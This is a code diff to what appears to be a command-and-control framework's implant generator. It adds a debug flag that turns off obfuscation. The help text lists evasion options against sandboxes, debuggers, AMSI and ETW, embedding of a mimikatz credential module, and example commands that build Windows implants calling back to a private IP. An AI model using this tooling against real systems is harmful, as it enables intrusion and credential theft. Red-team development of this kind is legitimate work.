@@ -805,6 +805,7 @@ func (is *InteractiveServer) handleGenerate(args []string) error {
 			"    --protocol, -p <proto>   Protocol: http, https, mtls (default: http)\n" +
 			"    --no-encrypt            Disable encryption\n" +
 			"    --no-obfuscate          Disable obfuscation\n" +
+			"    --debug                 Enable debug mode (console window, verbose logging, no obfuscation)\n" +
 			"    --modules, -m <ids>      Comma-separated Empire module IDs to embed\n" +
 			"    --evasion <options>      Evasion features (comma-separated)\n" +
 			"                             Options: sandbox,debugger,vm,etw,amsi,sleepmask,syscalls\n" +
@@ -813,7 +814,8 @@ func (is *InteractiveServer) handleGenerate(args []string) error {
 			"    generate stager windows amd64 -o /tmp/implant.exe -c https://example.com:443\n" +
 			"    generate full windows amd64 --callback 192.168.1.100:8443 --delay 60 --jitter 0.3\n" +
 			"    generate full windows amd64 -c http://192.168.1.100:8443 --modules powershell/credentials/mimikatz\n" +
-			"    generate full windows amd64 -c http://192.168.1.100:8443 --evasion sandbox,debugger,vm")
+			"    generate full windows amd64 -c http://192.168.1.100:8443 --evasion sandbox,debugger,vm\n" +
+			"    generate full windows amd64 -c http://192.168.1.100:8443 --debug")
 	}
 
 	payloadType := strings.ToLower(args[0])
@@ -858,6 +860,7 @@ func (is *InteractiveServer) handleGenerate(args []string) error {
 	var evasionStr string
 	encrypt := true
 	obfuscate := true
+	debug := false
 
 	for i := 3; i < len(args); i++ {
 		switch args[i] {
@@ -987,6 +990,10 @@ func (is *InteractiveServer) handleGenerate(args []string) error {
 			encrypt = false
 		case "--no-obfuscate":
 			obfuscate = false
+		case "--debug":
+			debug = true
+			// Debug mode automatically disables obfuscation
+			obfuscate = false
 		}
 	}
 
@@ -1060,6 +1067,7 @@ func (is *InteractiveServer) handleGenerate(args []string) error {
 		OS:          osTarget,
 		Encrypt:     encrypt,
 		Obfuscate:   obfuscate,
+		Debug:       debug,
 		Config:      is.config,
 		CallbackURL: callbackURL,
 		Delay:       delay,
